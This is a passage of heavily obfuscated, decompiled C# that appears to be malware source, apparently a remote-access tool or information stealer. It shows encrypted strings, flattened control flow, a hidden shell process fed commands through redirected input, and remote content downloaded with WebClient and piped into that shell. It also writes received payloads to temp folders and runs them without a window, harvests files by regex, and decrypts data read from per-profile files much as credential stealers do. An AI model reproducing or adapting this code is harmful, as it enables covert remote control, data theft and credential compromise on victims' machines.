					case 1u:
						try {
							byte[] bytes = Encoding.UTF8.GetBytes (file670 + flag6144.0e291526dfde44109a60e580c474e7dd ("f92ce34ee42e1"));
							range5844.StandardInput.BaseStream.Write (bytes, 0, bytes.Length);
							range5844.StandardInput.BaseStream.Flush ();
							return;
						} catch {
							return;
						}
					}
					break;
				}
			}
		}

		public void min33 (int left137)
		{
			string fileName = height9592 (left137);
			range5844 = new Process {
				StartInfo = new ProcessStartInfo {
					FileName = fileName,
					Arguments = flag6144.0e291526dfde44109a60e580c474e7dd ("54797d53b90b36cf26c81d3abf76a9e"),
					RedirectStandardInput = flag6144.09343d4890d2414f8aa92dc5c3eb3877 ("f98ad52f0bd1e"),
					RedirectStandardOutput = flag6144.09343d4890d2414f8aa92dc5c3eb3877 ("2c97527a088a4"),
					RedirectStandardError = flag6144.09343d4890d2414f8aa92dc5c3eb3877 ("ae5c8699c6999"),
					UseShellExecute = false,
					CreateNoWindow = flag6144.09343d4890d2414f8aa92dc5c3eb3877 ("9fab712906595"),
					WindowStyle = (ProcessWindowStyle)flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("c9ce7fde9fef15bb730"),
					WorkingDirectory = position291.max79
				}
			};
			while (true) {
				int num = -395020731;
				while (true) {
					uint num2;
					switch ((num2 = (uint)(num ^ -1335746723)) % 5) {
					case 3u:
						break;
					default:
						num = -395020731;
						continue;
					case 0u:
						range5844.BeginErrorReadLine ();
						num = (int)num2 + -1756463522;
						continue;
					case 2u:
						range5844.ErrorDataReceived += delegate {
						};
						range5844.Start ();
						range5844.BeginOutputReadLine ();
						num = -143716361;
						continue;
					case 4u:
						range5844.OutputDataReceived += delegate {
						};
						num = ~660647993;
						continue;
					case 1u:
						return;
					}
					break;
				}
			}
		}

		public void mode718 ()
		{
			if (range5844 == null) {
				return;
			}
			while (true) {
				int num = -353274840;
				while (true) {
					uint num2;
					switch ((num2 = (uint)((num ^ 0x3595DDE8) - -1501321629)) % 4) {
					case 2u:
						break;
					default:
						num = -353274840;
						continue;
					case 1u:
						num = ((!range5844.HasExited) ? ((int)(num2 - 1182458571)) : ((int)(0 - num2) + -937208852));
						continue;
					case 0u:
						return;
					case 3u:
						try {
							range5844.StandardInput.Close ();
							return;
						} catch {
							return;
						}
					}
					break;
				}
			}
		}

		public void name4263 ()
		{
			if (range5844 == null) {
				goto IL_0008;
			}
			goto IL_0051;
			IL_0008:
			int num = -2133846085;
			goto IL_000d;
			IL_000d:
			while (true) {
				uint num2 = (uint)(num - 1470224075);
				switch (num2 % 6) {
				case 5u:
					break;
				default:
					num = -2133846085;
					continue;
				case 0u:
					range5844.Kill ();
					num = (int)(~num2 + 1970675036);
					continue;
				case 1u:
					goto IL_0051;
				case 2u:
					range5844.Close ();
					range5844 = null;
					num = -911910710;
					continue;
				case 4u:
					return;
				case 3u:
					return;
				}
				break;
			}
			goto IL_0008;
			IL_0051:
			num = (range5844.HasExited ? 1729509571 : 1711389539);
			goto IL_000d;
		}
	}
}
namespace next283
{
	public class target2353
	{
		public static List<error0736> width836 (List<item825> width5191)
		{
			List<error0736> list839 = new List<error0736> ();
			item825 current615 = default(item825);
			error0736 error760 = default(error0736);
			while (true) {
				int num = --82058478;
				while (true) {
					uint num2 = (uint)(num + 1582655956);
					switch (num2 % 5) {
					case 0u:
						break;
					default:
						num = 82058478;
						continue;
					case 2u:
						return list839;
					case 1u:
						num = (int)((width5191.Count == 0) ? (num2 - 1530642585) : ((0 - num2) ^ 0x2153CF65));
						continue;
					case 4u:
						num = ((width5191 == null) ? ((int)(~num2 ^ 0x23BBDD48)) : ((int)num2 - -1495954552));
						continue;
					case 3u: {
						using List<item825>.Enumerator enumerator = width5191.GetEnumerator ();
						while (true) {
							int num3 = (enumerator.MoveNext () ? (-1325477087) : (~-460217086));
							while (true) {
								num2 = (uint)(num3 + 1672752550);
								switch (num2 % 6) {
								case 2u:
									num3 = -1325477087;
									continue;
								default:
									num3 = -1325477087;
									continue;
								case 5u:
									current615 = enumerator.Current;
									num3 = ((current615 == null) ? (-882474745) : (-1370452800));
									continue;
								case 4u:
									error760 = right490 (current615);
									num3 = (int)((error760.node951.Count <= 0) ? (num2 - 1184774495) : ((0 - num2) ^ 0x249D9C76));
									continue;
								case 3u:
									break;
								case 0u:
									list839.Add (error760);
									num3 = (int)num2 + -1639220875;
									continue;
								case 1u:
									return list839;
								}
								break;
							}
						}
					}
					}
					break;
				}
			}
		}

		private static error0736 right490 (item825 parent750)
		{
			error0736 error760 = new error0736 {
				color7863 = parent750.name1443,
				node951 = new List<FileSystemInfo> ()
			};
			List<string> list839 = default(List<string>);
			List<Regex> list840 = default(List<Regex>);
			DirectoryInfo directoryInfo = default(DirectoryInfo);
			while (true) {
				int num = ~2013717456;
				while (true) {
					uint num2;
					switch ((num2 = (uint)(num + -456230934)) % 9) {
					case 7u:
						break;
					default:
						num = -2013717457;
						continue;
					case 6u:
						list839 = parent750.stream215.SelectMany (delegate(string speed85) {
							string text874 = array7199.level443 (speed85);
							if (string.IsNullOrEmpty (text874)) {
								return new string[0];
							}
							char[] array8362 = new char[flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("1e9c1266a87f9eda797")];
							array8362 [0] = (char)flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("3e9cce5ea451c8204fb");
							return from text875 in text874.Split (array8362)
								select text875.Trim () into value
								where !string.IsNullOrEmpty (value)
								select value;
						}).Distinct ().ToList ();
						num = ((list839.Count != 0) ? 1720813833 : (--1579440046));
						continue;
					case 8u:
						num = (int)((parent750.stream215 == null) ? (num2 + 2110018988) : ((0 - num2) ^ 0x69CD5A75));
						continue;
					case 4u:
						return error760;
					case 0u:
						list840 = time0098.amount71 (parent750.error70 ?? new List<string> ());
						num = 488584163;
						continue;
					case 3u:
						num = ((parent750 == null) ? ((int)((0 - num2) ^ 0xAE2FA05)) : ((int)(0 - num2) + -1542498203));
						continue;
					case 5u:
						num = ((parent750.stream215.Count != 0) ? ((int)(0 - num2) ^ -188325615) : ((int)num2 ^ -148275125));
						continue;
					case 1u:
						return error760;
					case 2u: {
						foreach (string item in list839) {
							try {
								if (string.IsNullOrEmpty (item)) {
									continue;
								}
								while (true) {
									IL_0174:
									int num3 = --72417226;
									while (true) {
										num2 = (uint)(num3 ^ 0x3D8116A1);
										switch (num2 % 7) {
										case 6u:
											break;
										default:
											num3 = 72417226;
											continue;
										case 1u:
											directoryInfo = new DirectoryInfo (item);
											num3 = ~-176661918;
											continue;
										case 3u:
											num3 = (directoryInfo.Exists ? ((int)(num2 ^ 0x48FADDE3)) : ((int)(0 - num2) ^ -2062836646));
											continue;
										case 2u:
											num3 = ((item.IndexOfAny (Path.GetInvalidPathChars ()) < 0) ? ((int)(~num2) + -1230302085) : ((int)(num2 + 835635352)));
											continue;
										case 0u:
											goto end_IL_017a;
										case 4u:
											goto end_IL_017a;
										case 5u:
											foreach (FileInfo item2 in new status423 (directoryInfo, flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("66113dd62f5acefe69c")).temp9672 ()) {
												try {
													string fullName = item2.FullName;
													string fullName2 = directoryInfo.FullName;
													if (fullName.Length < fullName2.Length) {
														continue;
													}
													string relativePath = default(string);
													while (true) {
														IL_0283:
														int num4 = --2111912370;
														while (true) {
															int num5;
															switch ((num2 = (uint)(~num4 ^ -633811791)) % 8) {
															case 3u:
																break;
															default:
																num4 = 2111912370;
																continue;
															case 0u: {
																string text873 = fullName.Substring (fullName2.Length);
																char[] array8361 = new char[flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("e96d2c3905e51fbe0f1")];
																array8361 [0] = Path.DirectorySeparatorChar;
																array8361 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("8e812b12ec9de6fd5e6")] = Path.AltDirectorySeparatorChar;
																relativePath = text873.TrimStart (array8361);
																num4 = ~-1284527916;
																continue;
															}
															case 6u:
																goto end_IL_0289;
															case 1u:
																error760.node951.Add (item2);
																num4 = (int)(~num2) + -1430868762;
																continue;
															case 7u:
																num5 = (list840.Exists ((Regex state72) => state72.IsMatch (relativePath)) ? 1 : 0);
																goto IL_0358;
															case 5u:
																if (list840.Count == 0) {
																	num5 = flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("2d93d9b963ad691cc4b");
																	goto IL_0358;
																}
																num4 = (int)(num2 + 75910292);
																continue;
															case 4u:
																num4 = (fullName.StartsWith (fullName2, (StringComparison)flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("c92a5b67adef55f2206")) ? ((int)(0 - num2) ^ -564829206) : ((int)(~num2) + -1339797195));
																continue;
															case 2u:
																goto end_IL_0289;
																IL_0358:
																if (num5 != 0) {
																	num4 = --2078768167;
																	continue;
																}
																goto end_IL_0289;
															}
															goto IL_0283;
															continue;
															end_IL_0289:
															break;
														}
														break;
													}
												} catch {
												}
											}
											goto end_IL_017a;
										}
										goto IL_0174;
										continue;
										end_IL_017a:
										break;
									}
									break;
								}
							} catch {
							}
						}
						return error760;
					}
					}
					break;
				}
			}
		}
	}
}
namespace max4927
{
	public class array56
	{
		public static void column7144 (current614 mode39)
		{
			if (mode39 == null) {
				goto IL_0006;
			}
			goto IL_00df;
			IL_0006:
			int num = 915087473;
			goto IL_000b;
			IL_000b:
			byte b = default(byte);
			while (true) {
				uint num2 = (uint)(-num ^ -777757386);
				switch (num2 % 12) {
				case 7u:
					break;
				default:
					num = 915087473;
					continue;
				case 0u:
					total9059 (mode39);
					return;
				case 8u:
					goto IL_0063;
				case 2u:
					return;
				case 1u:
					return;
				case 10u:
					switch (b) {
					case 0:
						break;
					case 2:
						goto IL_0063;
					default:
						goto IL_00a5;
					case 1:
						goto IL_00b2;
					case 5:
						goto IL_00c4;
					case 3:
					case 4:
						return;
					}
					goto case 0u;
				case 11u:
					goto IL_00b2;
				case 6u:
					goto IL_00c4;
				case 9u:
					goto IL_00df;
				case 3u:
					return;
				case 5u:
					return;
				case 4u:
					return;
					IL_00c4:
					time190 (mode39, flag6144.09343d4890d2414f8aa92dc5c3eb3877 ("bc4c9699421dd"));
					num = ~-1828886267;
					continue;
					IL_00b2:
					time190 (mode39);
					num = --1537620660;
					continue;
					IL_00a5:
					num = (int)(~num2 + 681739702);
					continue;
					IL_0063:
					cache44 (mode39);
					num = ~-694382582;
					continue;
				}
				break;
			}
			goto IL_0006;
			IL_00df:
			b = mode39.max34;
			num = ~-753052101;
			goto IL_000b;
		}

		private static void total9059 (current614 product451)
		{
			if (product451 == null) {
				return;
			}
			while (true) {
				int num = -797519977;
				while (true) {
					uint num2 = (uint)(num ^ -48105630);
					string text874;
					int num4;
					switch (num2 % 5) {
					case 0u:
						break;
					default:
						num = -797519977;
						continue;
					case 4u:
						return;
					case 2u:
						num = ((product451.input0730 != null) ? ((int)num2 ^ -1851364885) : ((int)(0 - num2 + 664857578)));
						continue;
					case 3u:
						num = (int)(string.IsNullOrEmpty (product451.stream03) ? (num2 - 1345662217) : (~num2 ^ 0x65F7EF96));
						continue;
					case 1u:
						{
							string tempPath = Path.GetTempPath ();
							string path578 = Guid.NewGuid ().ToString (flag6144.0e291526dfde44109a60e580c474e7dd ("5bd13c5e9439c"));
							string text873 = Path.Combine (tempPath, path578);
							Directory.CreateDirectory (text873);
							text874 = Path.Combine (text873, product451.stream03);
							try {
								if (File.Exists (text874)) {
									goto IL_00b9;
								}
								goto IL_010a;
								IL_00b9:
								int num3 = 1336718077;
								goto IL_00be;
								IL_00be:
								while (true) {
									num2 = (uint)(num3 - -347501786);
									switch (num2 % 6) {
									case 0u:
										break;
									default:
										num3 = 1336718077;
										continue;
									case 1u:
										goto IL_00ed;
									case 4u:
										goto IL_010a;
									case 5u:
										return;
									case 3u:
										File.Delete (text874);
										num3 = (int)num2 + -969068809;
										continue;
									case 2u:
										goto end_IL_00b1;
									}
									break;
									IL_00ed:
									num3 = (int)((!File.Exists (text874)) ? (num2 + 1648922) : (~num2 + 1782714548));
								}
								goto IL_00b9;
								IL_010a:
								File.WriteAllBytes (text874, product451.input0730);
								num3 = -240083749;
								goto IL_00be;
								end_IL_00b1:;
							} catch {
							}
							if (product451.stream03.map23 (flag6144.0e291526dfde44109a60e580c474e7dd ("d9b2739ef1c5369a685"))) {
								goto IL_015a;
							}
							goto IL_023b;
						}
						IL_023b:
						num4 = (product451.stream03.map23 (flag6144.0e291526dfde44109a60e580c474e7dd ("1c946f3ec5231dc66f3")) ? (-391106205) : (-563950535));
						goto IL_0160;
						IL_0160:
						while (true) {
							switch ((num2 = (uint)(num4 ^ -580383952)) % 8) {
							case 0u:
								break;
							default:
								num4 = -1773699634;
								continue;
							case 3u:
								Process.Start (new ProcessStartInfo {
									FileName = flag6144.0e291526dfde44109a60e580c474e7dd ("8eb37794ce435b0e9ff33d16662ccf5"),
									Arguments = flag6144.0e291526dfde44109a60e580c474e7dd ("582d1d16ae18075a16f5156c6295d7f6c0537e28837056e56f203fe379feba716591d4d9f") + text874 + flag6144.0e291526dfde44109a60e580c474e7dd ("1e9c9dcfd7307"),
									UseShellExecute = flag6144.09343d4890d2414f8aa92dc5c3eb3877 ("f9a7f89deb313"),
									CreateNoWindow = flag6144.09343d4890d2414f8aa92dc5c3eb3877 ("6fefbdc01819f"),
									WindowStyle = (ProcessWindowStyle)flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("2f972fdd95cd91f343a")
								});
								num4 = (int)((0 - num2) ^ 0x1D58D077);
								continue;
							case 1u:
								Process.Start (new ProcessStartInfo {
									FileName = text874,
									UseShellExecute = flag6144.09343d4890d2414f8aa92dc5c3eb3877 ("0c9a699733672")
								});
								num4 = -2060068;
								continue;
							case 5u:
								goto IL_023b;
							case 2u:
								return;
							case 6u:
								Process.Start (new ProcessStartInfo {
									FileName = flag6144.0e291526dfde44109a60e580c474e7dd ("71d64f5401713aff8bbf6d0ff9f"),
									Arguments = flag6144.0e291526dfde44109a60e580c474e7dd ("5c712a9e8ea9e") + text874 + flag6144.0e291526dfde44109a60e580c474e7dd ("1f9c8b61eeddc6fdec7932f98f28b50ef0b"),
									UseShellExecute = flag6144.09343d4890d2414f8aa92dc5c3eb3877 ("8f38e259520dd"),
									CreateNoWindow = flag6144.09343d4890d2414f8aa92dc5c3eb3877 ("0e9baed6f4218"),
									WindowStyle = (ProcessWindowStyle)flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("74bde46e033da29609d")
								});
								num4 = (int)((0 - num2) ^ 0x725B8BBD);
								continue;
							case 7u:
								return;
							case 4u:
								return;
							}
							break;
						}
						goto IL_015a;
						IL_015a:
						num4 = ~1773699633;
						goto IL_0160;
					}
					break;
				}
			}
		}

		private static void time190 (current614 input214, bool input093 = false)
		{
			if (input214 == null) {
				return;
			}
			while (true) {
				int num = ~617886539;
				while (true) {
					uint num2;
					error759 obj2;
					switch ((num2 = (uint)(num + 699091837)) % 5) {
					case 0u:
						break;
					default:
						num = -617886540;
						continue;
					case 2u:
						num = ((!string.IsNullOrEmpty (input214.stream03)) ? ((int)(num2 + 56517450)) : ((int)(0 - num2) + -532984372));
						continue;
					case 3u:
						return;
					case 4u:
						if (input093) {
							num = 203517364;
							continue;
						}
						goto IL_0085;
					case 1u:
						{
							string address = input214.stream03;
							try {
								input214.stream03 = new WebClient ().DownloadString (address);
							} catch {
								return;
							}
							goto IL_0085;
						}
						IL_0085:
						obj2 = new error759 ();
						obj2.min33 (data780.stack3101 ? flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("1d9e74485e49ab25e63") : flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("d9765646aed703a1e94"));
						obj2.stack182 (input214.stream03);
						return;
					}
					break;
				}
			}
		}

		private static void cache44 (current614 balance973)
		{
			if (balance973 == null) {
				return;
			}
			while (true) {
				int num = -615654498;
				while (true) {
					uint num2 = (uint)(num + 1072443340);
					switch (num2 % 5) {
					case 0u:
						break;
					default:
						num = -615654498;
						continue;
					case 1u: {
						cell77 obj = new cell77 ();
						obj.node6133 ();
						obj.index87 (balance973.stream03);
						num = -1065610587;
						continue;
					}
					case 4u:
						return;
					case 2u:
						num = ((!string.IsNullOrEmpty (balance973.stream03)) ? ((int)(0 - num2) ^ -398488743) : ((int)(num2 ^ 0x3688F4DA)));
						continue;
					case 3u:
						return;
					}
					break;
				}
			}
		}
	}
}
namespace temp58
{
	public class current15
	{
		public static node471 start448 (row24 index05)
		{
			if (cell442 (index05, flag6144.0e291526dfde44109a60e580c474e7dd ("7c7b7acf5fa91a6db1bfc02ba57be0b9d")) == null) {
				goto IL_0012;
			}
			goto IL_0072;
			IL_0012:
			int num = ~-2078079229;
			goto IL_0018;
			IL_0018:
			string text873 = default(string);
			while (true) {
				uint num2;
				switch ((num2 = (uint)(num + -147027282)) % 7) {
				case 6u:
					break;
				default:
					num = 2078079228;
					continue;
				case 5u:
					goto IL_004b;
				case 3u:
					goto IL_0072;
				case 2u:
					return null;
				case 1u:
					return null;
				case 4u:
					goto IL_0096;
				case 0u:
					return session20.data38 (text873);
				}
				break;
				IL_0096:
				num = (int)((!string.IsNullOrEmpty (text873)) ? (~num2 + 827096824) : (num2 ^ 0x6A8E1C13));
				continue;
				IL_004b:
				num = ((cell442 (index05, flag6144.0e291526dfde44109a60e580c474e7dd ("beb7514728c37c2b4dd52982e38692426b433cd51")) == null) ? ((int)(0 - num2) + -471736735) : ((int)(num2 ^ 0x67752EF7)));
			}
			goto IL_0012;
			IL_0072:
			text873 = error7926 (index05);
			num = 773207428;
			goto IL_0018;
		}

		public static args3819 args5032 (row24 flag3449, node471 node4084 = null)
		{
			if (flag3449 == null) {
				goto IL_0006;
			}
			goto IL_02ac;
			IL_0006:
			int num = 1820691559;
			goto IL_000b;
			IL_000b:
			byte[] array8362 = default(byte[]);
			string text873 = default(string);
			byte[] array8364 = default(byte[]);
			List<next84> config = default(List<next84>);
			string limit = default(string);
			string text874 = default(string);
			byte[] array8363 = default(byte[]);
			byte[] array8361 = default(byte[]);
			while (true) {
				uint num2 = (uint)(num - -3370661);
				object array8365;
				switch (num2 % 24) {
				case 17u:
					break;
				default:
					num = 1820691559;
					continue;
				case 9u:
					if (node4084 == null) {
						num = (int)(num2 ^ 0x38B2A939);
						continue;
					}
					array8365 = node4084.format19;
					goto IL_01b6;
				case 2u:
					array8362 = session20.graph5474 (text873, array8364);
					num = --1745653769;
					continue;
				case 19u:
					goto IL_00ad;
				case 1u:
					goto IL_00cb;
				case 7u:
					goto IL_00e6;
				case 15u:
					config = source1909 (flag3449.format5368, node4084?.format19);
					num = 1587452691;
					continue;
				case 22u:
					goto IL_0126;
				case 10u:
					goto IL_013f;
				case 21u:
					goto IL_0157;
				case 14u:
					goto IL_0174;
				case 12u:
					return null;
				case 13u:
					array8365 = null;
					goto IL_01b6;
				case 3u:
					array8362 = session20.dict307 (node4084.format19, text873, array8364);
					num = (int)(num2 ^ 0xE3E8D11);
					continue;
				case 23u:
					goto IL_01ef;
				case 20u:
					return null;
				case 5u:
					text873 = error7926 (flag3449);
					limit = position33 (flag3449, text874);
					array8363 = total94.count861 (text874);
					array8364 = next74 (text874);
					num = --1201084535;
					continue;
				case 18u:
					goto IL_0240;
				case 4u:
					array8361 = null;
					num = (int)num2 - -390119292;
					continue;
				case 16u:
					goto IL_027a;
				case 11u:
					return null;
				case 0u:
					goto IL_02ac;
				case 6u:
					array8362 = null;
					num = (int)num2 - -94952855;
					continue;
				case 8u:
					{
						return new args3819 {
							format205 = flag3449.index144,
							context5068 = flag3449.date30.FullName,
							price61 = limit,
							dir2850 = text873,
							dir620 = array8361,
							array9821 = array8362,
							file372 = config
						};
					}
					IL_01b6:
					array8361 = index154 ((list47)array8365, array8363) ?? total94.code190 (array8363);
					num = 230614412;
					continue;
				}
				break;
				IL_027a:
				num = (int)((!string.IsNullOrEmpty (text873)) ? (0 - num2 + 160315482) : (~num2 + 1008747238));
				continue;
				IL_00ad:
				num = ((array8362 == null) ? ((int)num2 - -1690424948) : ((int)(~num2) ^ -1729386010));
				continue;
				IL_00e6:
				num = ((node4084 != null) ? ((int)(0 - num2) ^ -2022454297) : ((int)(num2 + 1903740827)));
				continue;
				IL_0240:
				num = ((array8362.Length == flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("f9e7c7e9e8cde94c82a")) ? ((int)(0 - num2) ^ -1960379097) : ((int)(num2 ^ 0x607C8B07)));
				continue;
				IL_0157:
				num = ((array8363 == null) ? ((int)(~num2 + 1828559562)) : ((int)num2 + -481365665));
				continue;
				IL_0126:
				num = ((array8362 == null) ? (--908725637) : (--946392201));
				continue;
				IL_01ef:
				num = ((array8362 != null) ? (~-480388142) : (~-2091456982));
				continue;
				IL_00cb:
				array8362 = null;
				num = ((array8364 == null) ? (--908725637) : 96650939);
				continue;
				IL_013f:
				num = ((array8361 == null) ? 329716838 : (--1959712018));
				continue;
				IL_0174:
				num = (int)((array8362.Length == flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("69ca44fa3b6e0bcc49c")) ? (num2 ^ 0xEB636AB) : (num2 - 139360741));
			}
			goto IL_0006;
			IL_02ac:
			text874 = current4886 (flag3449);
			num = ((!string.IsNullOrEmpty (text874)) ? 2027746392 : (--1801941054));
			goto IL_000b;
		}

		private static List<next84> source1909 (IEnumerable<width422> buffer2180, list47 status99)
		{
			return buffer2180.Select ((width422 price5667) => list38 (price5667, status99)).ToList ();
		}

		private static next84 list38 (width422 flag384, list47 tree0285)
		{
			string fullName = flag384.column158.FullName;
			string path579 = default(string);
			input6339 list839 = default(input6339);
			input6339 size710 = default(input6339);
			input6339 index = default(input6339);
			input6339 options801 = default(input6339);
			input6339 path578 = default(input6339);
			string score747 = default(string);
			while (true) {
				int num = -1541906541;
				while (true) {
					uint num2 = (uint)(num - 1744145847);
					switch (num2 % 5) {
					case 0u:
						break;
					default:
						num = -1541906541;
						continue;
					case 3u:
						path579 = Path.Combine (fullName, flag6144.0e291526dfde44109a60e580c474e7dd ("ad800b23d95f29287707246f4"));
						list839 = list75 (tree0285, Path.Combine (fullName, flag6144.0e291526dfde44109a60e580c474e7dd ("9c3fd4cabd3519f609e7d4c5e")), flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("3e96160c1c12a4a75a7"));
						size710 = list75 (tree0285, Path.Combine (fullName, flag6144.0e291526dfde44109a60e580c474e7dd ("2d9506e5add77f7ba90f490b726")), flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("ac8ea47c6a953770f69"));
						num = (int)num2 ^ -1568833149;
						continue;
					case 2u: {
						string[] array8361 = new string[flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("3e973b4d71572bd9272")];
						array8361 [0] = Path.Combine (path579, flag6144.0e291526dfde44109a60e580c474e7dd ("4a96cebc699796e223cd9f49d"));
						array8361 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("bf349efab09c574c848")] = Path.Combine (fullName, flag6144.0e291526dfde44109a60e580c474e7dd ("71c7361721706f32ccbd7039e"));
						index = path81 (tree0285, array8361);
						string[] array8362 = new string[flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("e96928bd91eb61c788b")];
						array8362 [0] = Path.Combine (fullName, flag6144.0e291526dfde44109a60e580c474e7dd ("796eef6430d5fe3f536c178538cb89c"));
						array8362 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("e919a811ebfba103acc")] = Path.Combine (path579, flag6144.0e291526dfde44109a60e580c474e7dd ("d9a847400aefffbadb206e2586fe3b2"));
						options801 = path81 (tree0285, array8362);
						string[] array8363 = new string[flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("8fe74d08509fbba530f")];
						array8363 [0] = Path.Combine (fullName, flag6144.0e291526dfde44109a60e580c474e7dd ("ac0655bad66c725970dc33b574299d9f109af44b19d37114c0e7440"));
						array8363 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("3f96103caa26d1087dd")] = Path.Combine (path579, flag6144.0e291526dfde44109a60e580c474e7dd ("8cdb88acaaf3c0f38ffad17450a0985ad82bba6c334297e803c7421"));
						path578 = path81 (tree0285, array8363);
						num = (int)num2 ^ -1085771259;
						continue;
					}
					case 1u:
						score747 = child5549 (Path.Combine (fullName, flag6144.0e291526dfde44109a60e580c474e7dd ("2e9b443ed0200ad4e04ac0a1efc2e9b50")));
						num = (int)(0 - num2) ^ -1509332996;
						continue;
					case 4u:
						return new next84 {
							number9326 = flag384.source238,
							limit63 = fullName,
							offset6235 = options801,
							line50 = index,
							stream2062 = path578,
							options536 = list839,
							row1817 = size710,
							start54 = score747
						};
					}
					break;
				}
			}
		}

		private static byte[] index154 (list47 array606, byte[] options234)
		{
			if (array606 != null) {
				byte[] result = default(byte[]);
				byte[] array8361 = default(byte[]);
				while (true) {
					int num = -820723649;
					while (true) {
						uint num2;
						switch ((num2 = (uint)(~num ^ 0x67BE2E88)) % 5) {
						case 3u:
							break;
						default:
							num = -820723649;
							continue;
						case 0u:
							goto end_IL_0003;
						case 4u:
							goto IL_003d;
						case 1u:
							goto IL_0057;
						case 2u:
							try {
								if (!array606.speed285 (options234, flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("f931028442d8e74bb67"))) {
									goto IL_0086;
								}
								goto IL_01a3;
								IL_0086:
								int num3 = ~1657077155;
								goto IL_008c;
								IL_008c:
								while (true) {
									num2 = (uint)(num3 + -713126422);
									switch (num2 % 14) {
									case 12u:
										break;
									default:
										num3 = -1657077156;
										continue;
									case 9u:
										goto IL_00dc;
									case 3u:
										goto IL_00f6;
									case 2u:
										goto IL_011d;
									case 11u:
										goto IL_0139;
									case 10u:
										result = null;
										goto end_IL_0070;
									case 5u:
										goto end_IL_0070;
									case 4u:
										goto IL_0180;
									case 7u:
										goto IL_01a3;
									case 8u:
										result = null;
										num3 = (int)((0 - num2) ^ 0x60218771);
										continue;
									case 13u:
										result = null;
										num3 = 850109175;
										continue;
									case 6u:
										result = null;
										goto end_IL_0070;
									case 1u:
										goto end_IL_0070;
									case 0u:
										result = array8361;
										goto end_IL_0070;
									}
									break;
									IL_0180:
									num3 = ((array8361.Length != flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("3f95280f921bb87b22c")) ? (--2118114199) : (-2077295409));
									continue;
									IL_00dc:
									num3 = ((array8361.Length != 0) ? ((int)((0 - num2) ^ 0x73A199F)) : ((int)(0 - num2) ^ -1105630266));
									continue;
									IL_011d:
									num3 = ((array8361 == null) ? ((int)(~num2) ^ -1746333290) : ((int)(~num2 ^ 0x218E17B4)));
									continue;
									IL_0139:
									num3 = ((array8361.Length == flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("637f1e419cf8cc5a89c")) ? 1536028180 : 1910471136);
									continue;
									IL_00f6:
									num3 = ((array8361 [0] != flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("4a14265edc623dc089f")) ? ((int)num2 - -613568734) : ((int)(~num2) + -1579728190));
								}
								goto IL_0086;
								IL_01a3:
								array8361 = array606.key6912 (flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("bcc2c8599b9bf4f898c"));
								num3 = --1910625608;
								goto IL_008c;
								end_IL_0070:;
							} catch {
								result = null;
							}
							return result;
						}
						break;
						IL_0057:
						num = ((options234 == null) ? ((int)num2 ^ -1474534135) : ((int)((0 - num2) ^ 0x485193F7)));
						continue;
						IL_003d:
						num = (int)((options234.Length != 0) ? (0 - num2 + 1104334888) : (~num2 ^ 0x780C2786));
					}
					continue;
					end_IL_0003:
					break;
				}
			}
			return null;
		}

		private static input6339 list75 (list47 buffer107, string stack5684, int balance9176 = int.MaxValue)
		{
			if (string.IsNullOrEmpty (stack5684)) {
				return null;
			}
			if (buffer107 != null) {
				try {
					byte[] array8361 = buffer107.current29 (stack5684, balance9176, flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("d94a5bd795fbb816e94"), flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("5f5484cbe9ae3a0dc9f"), flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("d9dc5d3fcdd203a6e86"));
					input6339 result = default(input6339);
					while (true) {
						IL_0037:
						int num = ~1372586671;
						while (true) {
							uint num2;
							switch ((num2 = (uint)(-num ^ 0x693B8BAF)) % 6) {
							case 0u:
								break;
							default:
								num = -1372586672;
								continue;
							case 3u:
								num = ((array8361 == null) ? ((int)((0 - num2) ^ 0x46CA5399)) : ((int)num2 + -1701578978));
								continue;
							case 2u:
								num = ((array8361.Length != 0) ? ((int)num2 + -1659788509) : ((int)num2 ^ -999960300));
								continue;
							case 4u:
								result = new input6339 (new FileInfo (stack5684), array8361);
								num = (int)num2 ^ -69492342;
								continue;
							case 1u:
								goto end_IL_003d;
							case 5u:
								return result;
							}
							goto IL_0037;
							continue;
							end_IL_003d:
							break;
						}
						break;
					}
				} catch {
				}
			}
			return rate91.context9200 (stack5684, balance9176);
		}

		private static input6339 path81 (list47 node43, params string[] current17)
		{
			if (current17 == null) {
				goto IL_0006;
			}
			goto IL_00a2;
			IL_0006:
			int num = 215976226;
			goto IL_000b;
			IL_000b:
			int num3 = default(int);
			input6339 input6340 = default(input6339);
			string[] array8361 = default(string[]);
			while (true) {
				uint num2 = (uint)(-num ^ -1799618114);
				switch (num2 % 10) {
				case 6u:
					break;
				default:
					num = 215976226;
					continue;
				case 0u:
					num3 += flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("c94dfc4feac9e3497ce");
					num = --1801531433;
					continue;
				case 1u:
					goto IL_0063;
				case 7u:
					return input6340;
				case 5u:
					goto IL_0088;
				case 8u:
					goto IL_00a2;
				case 4u:
					return null;
				case 3u:
					num3 = 0;
					num = (int)num2 - -1319693220;
					continue;
				case 9u: {
					string stack599 = array8361 [num3];
